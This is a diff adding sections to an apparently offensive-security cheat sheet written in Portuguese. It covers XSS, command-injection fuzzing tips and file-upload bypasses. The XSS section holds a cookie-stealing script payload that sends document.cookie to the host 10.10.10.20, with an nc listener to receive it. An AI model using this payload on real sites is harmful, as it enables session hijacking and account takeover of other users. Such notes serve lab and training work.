@@ -220,3 +220,19 @@ diretório acessível (`interface` do gerenciador de arquivos, compartilhamento 
 3: Restrição do lado do servidor: altere o `número mágico`, o `nome da extensão do arquivo`, etc.
 
 4: Restrição inexplorável: é uma `toca de coelho`
+
+## XSS
+
+1: Roube o `cookie` do administrador ou de outro usuário online para `ignorar o login`
+  - a: `<script>new Image().src="http://10.10.10.20/file.jpg?cookie="+document.cookie;</script,`
+  - b: `nc -nlvp 80`
+
+## Command Injection
+
+1: Se você puder encontrar o `código-fonte` para fazer uma revisão do código da `whitebox`
+
+2: Fuzzing `endpoint de API`
+
+3: Fuzz um `argumento`. Se não houver argumento, `adivinhe um`
+
+## WordPress
